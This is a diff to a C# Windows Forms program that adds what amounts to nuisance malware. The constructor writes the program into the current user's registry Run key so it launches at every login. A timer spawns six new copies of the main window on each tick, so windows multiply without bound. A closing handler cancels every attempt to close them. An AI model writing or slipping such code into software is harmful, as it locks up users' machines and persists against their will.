@@ -11,6 +11,11 @@ using System.Collections.Generic;
 using System.Drawing;
 using System.Windows.Forms;
 
+using System.ComponentModel;
+using System.Data;
+using System.Text;
+using Microsoft.Win32;
+
 namespace abc
 {
 	/// <summary>
@@ -18,6 +23,8 @@ namespace abc
 	/// </summary>
 	public partial class MainForm : Form
 	{
+		
+
 		public MainForm()
 		{
 			//
@@ -28,6 +35,8 @@ namespace abc
 			//
 			// TODO: Add constructor code after the InitializeComponent() call.
 			//
+			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+		registryKey.SetValue("MainForm", System.Reflection.Assembly.GetExecutingAssembly().Location);
 		}
 		
 		void CheckBox1CheckedChanged(object sender, EventArgs e)
@@ -85,8 +94,27 @@ WindowState = FormWindowState.Maximized;
 		
 		void Timer1Tick(object sender, EventArgs e)
 		{
+MainForm newForm = new MainForm();
+newForm.Show();
+MainForm newForm2 = new MainForm();
+newForm2.Show();
+MainForm newForm3 = new MainForm();
+newForm3.Show();
+MainForm newForm4 = new MainForm();
+newForm4.Show();
+MainForm newForm5 = new MainForm();
+newForm5.Show();
+MainForm newForm6 = new MainForm();
+newForm6.Show();
 			Random rnd = new Random();
 			this.BackColor = Color.FromArgb(rnd.Next(0, 255),rnd.Next(0, 255),rnd.Next(0, 255));
+		}
+		
+		
+		
+		void MainFormFormClosing(object sender, FormClosingEventArgs e)
+		{
+e.Cancel = true;
 		}
 	}
 }
